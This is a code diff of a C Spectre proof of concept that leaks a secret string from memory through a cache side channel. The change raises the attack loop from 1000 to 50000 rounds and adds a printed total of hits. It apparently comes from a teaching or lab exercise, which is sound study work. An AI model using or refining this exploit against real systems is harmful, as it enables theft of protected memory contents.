@@ -112,7 +112,7 @@ void reloadSideChannel(int scores[]) {
 
 int main() {
     size_t larger_x = (size_t)(secret - (char*)buffer);
-    int i, j=0, max;
+    int i, j=0, max, tot_hits = 0;
     int len = (int)strlen(secret);                          // calculates number of chars in the secret
     int scores[256];                                        // array to hold ascii value hit totals
     char *sourced_secret = malloc(len * sizeof(uint8_t));   // create a dynamic char array of the secret
@@ -128,7 +128,7 @@ int main() {
 
         // This runs the attack multiple times to improve the likely-hood of a hit, keep track of hits
         // for each ascii value from 0 to 255, the maximum number of hits will give us the secret byte
-        for (i = 0; i < 1000; i++) {
+        for (i = 0; i < 50000; i++) {
             spectreAttack(larger_x);
             reloadSideChannel(scores);
         }
@@ -148,10 +148,12 @@ int main() {
         // Store the secret value as an array for later output
         char c = (char) max;    // convert the ascii value to its corresponding char
         sourced_secret[j] = c;  // add char to the results array
+        tot_hits = tot_hits + scores[max];
         larger_x++;             // increment to the next memory location of secret
         j++;                    // increment to the next element in sourced_secret array
     }
 
     printf("\nThe secret is => %s\n", sourced_secret);
+    printf("\nThe hits for the solution: %d\n", tot_hits);
     return (0);
 }
